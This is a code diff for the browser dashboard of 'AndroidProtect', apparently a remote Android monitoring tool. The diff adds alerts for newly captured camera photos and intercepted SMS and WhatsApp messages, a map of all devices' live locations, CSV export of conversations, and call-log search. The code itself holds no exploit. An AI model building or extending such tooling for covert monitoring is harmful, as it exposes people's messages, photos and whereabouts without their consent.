@@ -1,6 +1,9 @@
 // Global variables
 let socket = null;
 let map = null;
+let showAllDevicesMode = false;
+const allDeviceMarkersMap = new Map(); // deviceId → {marker, circle}
+const deviceLastPositions = new Map(); // deviceId → {lat, lng, accuracy}
 let currentFsType = null; // 'screen' | 'front' | 'back'
 let deviceMarker = null;
 let deviceAccuracyCircle = null;
@@ -65,6 +68,33 @@ function getLinkToken(){ return localStorage.getItem('ap_linktoken') || ''; }
 
 function authHeaders() {
     return { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + getToken() };
+}
+
+// Global fetch wrapper — redirects to login on 401 (session expired)
+async function apiFetch(url, opts = {}) {
+    opts.headers = { ...authHeaders(), ...(opts.headers || {}) };
+    const res = await fetch(url, opts);
+    if (res.status === 401) {
+        showDisconnectBanner('Sessão expirada. Faça login novamente.', true);
+        setTimeout(() => { localStorage.removeItem('ap_token'); location.reload(); }, 2000);
+        throw new Error('Unauthorized');
+    }
+    return res;
+}
+
+// ─── Browser Notifications ────────────────────────────────────────────────────
+async function requestBrowserNotification() {
+    if (!('Notification' in window) || Notification.permission !== 'default') return;
+    await Notification.requestPermission();
+}
+
+function sendBrowserNotification(title, body) {
+    if (!('Notification' in window) || Notification.permission !== 'granted') return;
+    if (document.visibilityState === 'visible') return; // already watching
+    try {
+        const n = new Notification(title, { body, icon: '/favicon.ico' });
+        setTimeout(() => n.close(), 6000);
+    } catch (_) {}
 }
 
 // ─── Account Settings Modal ───────────────────────────────────────────────────
@@ -272,6 +302,7 @@ window.addEventListener('DOMContentLoaded', async () => {
     } catch (e) { console.warn('Failed to load /api/config', e); }
     initMapIfReady();   // Leaflet is synchronous — init after token is loaded
     connectWebSocket();
+    requestBrowserNotification();
     initMobileTabs();
     // Auto-refresh trail history every hour (to show new points without overloading the map)
     trailRefreshInterval = setInterval(() => {
@@ -328,6 +359,8 @@ function sidebarNav(tab, platform) {
             // Primary panels (map, control): restore the full scrollable grid
             // and scroll to the target card.
             desktopRestoreGrid();
+            // Leaflet needs to recalculate its container size when shown after being hidden
+            if (tab === 'map' && map) requestAnimationFrame(() => map.invalidateSize());
             const grid   = document.getElementById('dashboard-grid');
             const target = document.querySelector(`#dashboard-grid [data-tab="${tab}"]`);
             if (grid && target) {
@@ -412,6 +445,7 @@ function switchTab(tab) {
     document.querySelectorAll('#dashboard-grid [data-tab]').forEach(card => {
         card.classList.toggle('tab-visible', card.dataset.tab === tab);
     });
+    if (tab === 'map' && map) requestAnimationFrame(() => map.invalidateSize());
 
     // When switching to map tab, trigger resize so Leaflet re-renders
     if (tab === 'map' && map) {
@@ -824,6 +858,69 @@ function setMapType(type) {
 let wsReconnectDelay = 1000;
 const WS_RECONNECT_MAX_DELAY = 30000;
 
+function showDisconnectBanner(msg, isError = false) {
+    const banner = document.getElementById('disconnect-banner');
+    if (!banner) return;
+    banner.textContent = (isError ? '⚠️ ' : '🔴 ') + msg;
+    banner.className = 'disconnect-banner' + (isError ? ' disconnect-banner-error' : '');
+    banner.style.display = 'flex';
+}
+
+function hideDisconnectBanner() {
+    const banner = document.getElementById('disconnect-banner');
+    if (banner) banner.style.display = 'none';
+}
+
+// ─── Multi-device map markers ─────────────────────────────────────────────────
+function toggleShowAllDevices() {
+    showAllDevicesMode = !showAllDevicesMode;
+    const btn = document.getElementById('btn-show-all-devices');
+    if (btn) btn.classList.toggle('active', showAllDevicesMode);
+    if (showAllDevicesMode) {
+        refreshAllDeviceMarkers();
+    } else {
+        allDeviceMarkersMap.forEach(({ marker, circle }) => {
+            if (map) { map.removeLayer(marker); map.removeLayer(circle); }
+        });
+        allDeviceMarkersMap.clear();
+    }
+}
+
+function refreshAllDeviceMarkers() {
+    if (!map || !showAllDevicesMode) return;
+    deviceLastPositions.forEach((pos, devId) => {
+        if (devId === currentDeviceId) return; // already shown by main marker
+        upsertAllDeviceMarker(devId, pos.lat, pos.lng, pos.accuracy);
+    });
+}
+
+function upsertAllDeviceMarker(devId, lat, lng, accuracy) {
+    if (!map) return;
+    const dev = devicesMap.get(devId);
+    const name = dev?.model || devId;
+    const color = '#ff9900';
+    if (allDeviceMarkersMap.has(devId)) {
+        const { marker, circle } = allDeviceMarkersMap.get(devId);
+        marker.setLatLng([lat, lng]);
+        circle.setLatLng([lat, lng]);
+        circle.setRadius(accuracy || 20);
+    } else {
+        const icon = L.divIcon({
+            className: '',
+            html: `<div class="device-marker-dot" style="background:${color};box-shadow:0 0 10px ${color}80;"></div>`,
+            iconSize: [20, 20], iconAnchor: [10, 10]
+        });
+        const marker = L.marker([lat, lng], { icon, zIndexOffset: 500 }).addTo(map);
+        marker.bindTooltip(name, { permanent: false, direction: 'top' });
+        const circle = L.circle([lat, lng], {
+            radius: accuracy || 20,
+            color, opacity: 0.4, weight: 1,
+            fillColor: color, fillOpacity: 0.08
+        }).addTo(map);
+        allDeviceMarkersMap.set(devId, { marker, circle });
+    }
+}
+
 function connectWebSocket() {
     const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
     const wsUrl = `${protocol}//${window.location.host}/ws/dashboard?token=${encodeURIComponent(getToken())}`;
@@ -835,11 +932,13 @@ function connectWebSocket() {
 
     socket.onopen = () => {
         wsReconnectDelay = 1000; // reset backoff on a successful connection
+        hideDisconnectBanner();
         logToConsole('Conectado ao servidor de controle.', 'success');
     };
 
     socket.onclose = () => {
         const delaySec = (wsReconnectDelay / 1000).toFixed(0);
+        showDisconnectBanner(`Conexão perdida. Reconectando em ${delaySec}s…`);
         logToConsole(`Conexão perdida. Reconectando em ${delaySec} segundos...`, 'error');
         // Mark all devices as offline — don't clear the list, keep them visible
         devicesMap.forEach(dev => { dev.isOnline = false; });
@@ -917,6 +1016,7 @@ function handleJsonMessage(data) {
             
         case 'PHOTO_UPLOADED':
             logToConsole(`Nova foto recebida do dispositivo!`, 'success');
+            sendBrowserNotification('AndroidProtect — Nova foto', `Foto capturada em ${devicesMap.get(data.deviceId)?.model || data.deviceId}`);
             if (data.deviceId === currentDeviceId) {
                 fetchMediaList(currentDeviceId);
             }
@@ -1001,6 +1101,7 @@ function handleJsonMessage(data) {
             const srcEmoji = waPlatformEmoji(data.source);
             if (data.direction === 'in') {
                 logToConsole(`${srcEmoji} ${srcLabel} recebido de ${data.address || 'desconhecido'}: ${data.content}`, 'success');
+                sendBrowserNotification(`${srcLabel} — ${data.address || 'Mensagem nova'}`, data.content?.slice(0, 80) || '');
             } else if (data.direction === 'out') {
                 logToConsole(`📤 ${srcLabel} enviado para ${data.address || 'desconhecido'}: ${data.content}`, 'info');
             }
@@ -1807,6 +1908,16 @@ function refreshTrail() {
 
 // Handle real-time telemetry details (location, battery)
 function handleTelemetry(data) {
+    // Track last known position for ALL devices (for multi-device map mode)
+    if (data.lat != null && data.lng != null) {
+        const lat = parseFloat(data.lat), lng = parseFloat(data.lng);
+        if (!isNaN(lat) && !isNaN(lng) && !(lat === 0 && lng === 0)) {
+            deviceLastPositions.set(data.deviceId, { lat, lng, accuracy: parseFloat(data.accuracy) || 10 });
+            if (showAllDevicesMode && data.deviceId !== currentDeviceId) {
+                upsertAllDeviceMarker(data.deviceId, lat, lng, parseFloat(data.accuracy) || 10);
+            }
+        }
+    }
     if (data.deviceId !== currentDeviceId) return;
 
     if (data.battery !== undefined) {
@@ -1837,8 +1948,9 @@ function handleTelemetry(data) {
         // Mobile GPS bar
         updateGpsBar(lat, lng, accuracy, Date.now());
 
-        // Add to trail history cache (live point)
+        // Add to trail history cache (live point) — cap to avoid memory leak
         trailHistoryPoints.push({ lat, lng, accuracy, timestamp: Date.now() });
+        if (trailHistoryPoints.length > 10000) trailHistoryPoints.splice(0, trailHistoryPoints.length - 10000);
         const kEl = document.getElementById('trail-km');
         const pEl = document.getElementById('trail-pts');
         if (pEl) pEl.textContent = trailHistoryPoints.length;
@@ -1913,6 +2025,44 @@ async function deleteMediaFile(deviceId, type, fileName) {
     } catch (e) {
         alert('Erro de rede ao apagar arquivo.');
     }
+}
+
+// ─── Bulk photo selection mode ───────────────────────────────────────────────
+let photoSelectMode = false;
+const selectedPhotos = new Set(); // file names
+
+function togglePhotoSelectMode() {
+    photoSelectMode = !photoSelectMode;
+    selectedPhotos.clear();
+    const btn = document.getElementById('btn-photo-select');
+    const delBtn = document.getElementById('btn-photo-delete-selected');
+    if (btn) btn.classList.toggle('active', photoSelectMode);
+    if (delBtn) delBtn.style.display = photoSelectMode ? '' : 'none';
+    // Re-render gallery to add/remove checkboxes
+    if (currentDeviceId) fetchMediaList(currentDeviceId);
+}
+
+async function deleteSelectedPhotos() {
+    if (!selectedPhotos.size) { showToast('Nenhuma foto selecionada.', 'warn'); return; }
+    if (!confirm(`Apagar ${selectedPhotos.size} foto(s) selecionada(s)?`)) return;
+    const toDelete = [...selectedPhotos];
+    let deleted = 0;
+    for (const fileName of toDelete) {
+        try {
+            const res = await fetch(`/uploads/${currentDeviceId}/media/photos/${encodeURIComponent(fileName)}`, {
+                method: 'DELETE', headers: authHeaders()
+            });
+            if (res.ok) deleted++;
+        } catch (_) {}
+    }
+    showToast(`${deleted} foto(s) apagada(s).`, deleted ? 'success' : 'error');
+    selectedPhotos.clear();
+    photoSelectMode = false;
+    const btn = document.getElementById('btn-photo-select');
+    const delBtn = document.getElementById('btn-photo-delete-selected');
+    if (btn) btn.classList.remove('active');
+    if (delBtn) delBtn.style.display = 'none';
+    fetchMediaList(currentDeviceId);
 }
 
 // Clear all media of a given type for the current device
@@ -2027,16 +2177,34 @@ function renderPhotos(deviceId, photos) {
     pmPhotos.forEach((p, idx) => {
         const fileName = (photos[idx].name || photos[idx]);
         const photoDiv = document.createElement('div');
-        photoDiv.className = 'gallery-photo-item';
+        photoDiv.className = 'gallery-photo-item' + (photoSelectMode && selectedPhotos.has(fileName) ? ' photo-selected' : '');
         photoDiv.style.position = 'relative';
 
-        photoDiv.innerHTML = `
-            <img src="${escapeHtml(p.url)}" alt="Foto" loading="lazy">
-            <span class="photo-timestamp">${escapeHtml(p.caption)}</span>
-            <button class="media-delete-btn media-delete-overlay" title="Apagar foto"><i class="fa-solid fa-trash-can"></i></button>
-        `;
-        photoDiv.querySelector('img').addEventListener('click', () => openPhotoModal(idx));
-        photoDiv.querySelector('.media-delete-btn').addEventListener('click', (e) => { e.stopPropagation(); deleteMediaFile(deviceId, 'photos', fileName); });
+        if (photoSelectMode) {
+            const checked = selectedPhotos.has(fileName) ? 'checked' : '';
+            photoDiv.innerHTML = `
+                <img src="${escapeHtml(p.url)}" alt="Foto" loading="lazy">
+                <span class="photo-timestamp">${escapeHtml(p.caption)}</span>
+                <label class="photo-select-overlay" title="Selecionar"><input type="checkbox" ${checked} style="display:none"><span class="photo-select-check">${checked ? '✓' : ''}</span></label>
+            `;
+            photoDiv.addEventListener('click', () => {
+                if (selectedPhotos.has(fileName)) selectedPhotos.delete(fileName);
+                else selectedPhotos.add(fileName);
+                photoDiv.classList.toggle('photo-selected', selectedPhotos.has(fileName));
+                const check = photoDiv.querySelector('.photo-select-check');
+                if (check) check.textContent = selectedPhotos.has(fileName) ? '✓' : '';
+                const delBtn = document.getElementById('btn-photo-delete-selected');
+                if (delBtn) delBtn.textContent = selectedPhotos.size > 0 ? `🗑 Apagar (${selectedPhotos.size})` : 'Apagar Selecionadas';
+            });
+        } else {
+            photoDiv.innerHTML = `
+                <img src="${escapeHtml(p.url)}" alt="Foto" loading="lazy">
+                <span class="photo-timestamp">${escapeHtml(p.caption)}</span>
+                <button class="media-delete-btn media-delete-overlay" title="Apagar foto"><i class="fa-solid fa-trash-can"></i></button>
+            `;
+            photoDiv.querySelector('img').addEventListener('click', () => openPhotoModal(idx));
+            photoDiv.querySelector('.media-delete-btn').addEventListener('click', (e) => { e.stopPropagation(); deleteMediaFile(deviceId, 'photos', fileName); });
+        }
         gallery.appendChild(photoDiv);
     });
 }
@@ -3064,6 +3232,11 @@ function waIngestMessage(m) {
     if (m.id != null) {
         if (waSeenIds.has(m.id)) return;
         waSeenIds.add(m.id);
+        // Evict oldest entries to keep Set bounded
+        if (waSeenIds.size > 5000) {
+            const iter = waSeenIds.values();
+            for (let i = 0; i < 1000; i++) waSeenIds.delete(iter.next().value);
+        }
     }
     const rawAddr = (m.address && m.address.trim()) ? m.address.trim() : '';
     const rawName = (m.name && m.name.trim()) ? m.name.trim() : '';
@@ -3140,6 +3313,26 @@ function waReloadMessages(deviceId) {
 function waClearAllConversations() {
     if (!confirm('Recarregar todas as conversas do servidor?')) return;
     if (currentDeviceId) waReloadMessages(currentDeviceId);
+}
+
+function waExportConversation() {
+    if (!currentWaAddress) { showToast('Selecione uma conversa primeiro.', 'warn'); return; }
+    const conv = conversationsMap.get(currentWaAddress);
+    if (!conv || !conv.messages.length) { showToast('Nenhuma mensagem para exportar.', 'warn'); return; }
+    const rows = [['Data/Hora', 'Direção', 'Plataforma', 'Mensagem']];
+    conv.messages.forEach(m => {
+        const date = new Date(m.timestamp).toLocaleString('pt-BR');
+        const dir  = m.direction === 'out' ? 'Enviada' : 'Recebida';
+        const src  = waPlatformLabel(m.source || 'sms');
+        rows.push([date, dir, src, m.content || '']);
+    });
+    const csv  = rows.map(r => r.map(v => `"${String(v).replace(/"/g, '""')}"`).join(',')).join('\n');
+    const blob = new Blob(['﻿' + csv], { type: 'text/csv;charset=utf-8' });
+    const a    = document.createElement('a');
+    a.href     = URL.createObjectURL(blob);
+    a.download = `conversa_${waNormalizeChatKey(conv.name || currentWaAddress).replace(/[^a-z0-9]/gi, '_')}_${new Date().toISOString().slice(0, 10)}.csv`;
+    a.click();
+    URL.revokeObjectURL(a.href);
 }
 
 function waRenderSidebar() {
@@ -3510,10 +3703,8 @@ function fsStopStream() {
 }
 
 function togglePiP() {
-    const fsImg = document.getElementById('fs-stream-img');
-    if (fsImg && document.pictureInPictureEnabled) {
-        // PiP works on video elements; show a toast instead
-        alert('PiP requer elemento de vídeo. Use a tela cheia nativa do navegador (F11).');
+    if (document.pictureInPictureEnabled) {
+        showToast('PiP requer elemento de vídeo. Use a tela cheia nativa do navegador (F11).', 'info');
     }
 }
 
@@ -3606,6 +3797,8 @@ function contactAvatarColor(name) {
 // ═══════════════════════════════════════════════════════════════════════════
 // CALL LOGS
 // ═══════════════════════════════════════════════════════════════════════════
+let _allCallLogs = [];
+
 function syncCallLogs() {
     if (!currentDeviceId) { logToConsole('Nenhum dispositivo selecionado!', 'error'); return; }
     sendCommand('GET_CALL_LOG');
@@ -3623,24 +3816,37 @@ function fetchCallLogs(deviceId) {
 }
 
 function calllogsRender(rows) {
+    _allCallLogs = rows || [];
+    calllogsApplyFilter(document.getElementById('calllogs-search')?.value || '');
+}
+
+function calllogsFilter(q) { calllogsApplyFilter(q); }
+
+function calllogsApplyFilter(q) {
     const list  = document.getElementById('calllogs-list');
     const empty = document.getElementById('calllogs-empty');
     if (!list) return;
-    if (!rows || rows.length === 0) {
+    const lq = (q || '').toLowerCase();
+    const data = lq ? _allCallLogs.filter(c =>
+        (c.name   || '').toLowerCase().includes(lq) ||
+        (c.number || '').toLowerCase().includes(lq)
+    ) : _allCallLogs;
+    if (!data || data.length === 0) {
         list.style.display = 'none';
         empty.style.display = '';
+        empty.innerHTML = `<i class="fa-solid fa-phone fa-2x"></i><p>${_allCallLogs.length === 0 ? 'Selecione um dispositivo e clique em Sync' : 'Nenhuma ligação encontrada'}</p>`;
         return;
     }
     list.style.display = '';
     empty.style.display = 'none';
-    list.innerHTML = rows.map(c => {
+    list.innerHTML = data.map(c => {
         const typeIcon = {
             incoming: '<i class="fa-solid fa-phone-arrow-down-left cl-incoming"></i>',
             outgoing: '<i class="fa-solid fa-phone-arrow-up-right cl-outgoing"></i>',
             missed:   '<i class="fa-solid fa-phone-missed cl-missed"></i>',
             rejected: '<i class="fa-solid fa-phone-slash cl-missed"></i>',
         }[c.type] || '<i class="fa-solid fa-phone cl-incoming"></i>';
-        const dur = c.duration > 0 ? fmtDuration(c.duration) : '—';
+        const dur  = c.duration > 0 ? fmtDuration(c.duration) : '—';
         const date = new Date(c.timestamp).toLocaleString('pt-BR');
         return `<li class="cl-item">
             <span class="cl-icon">${typeIcon}</span>
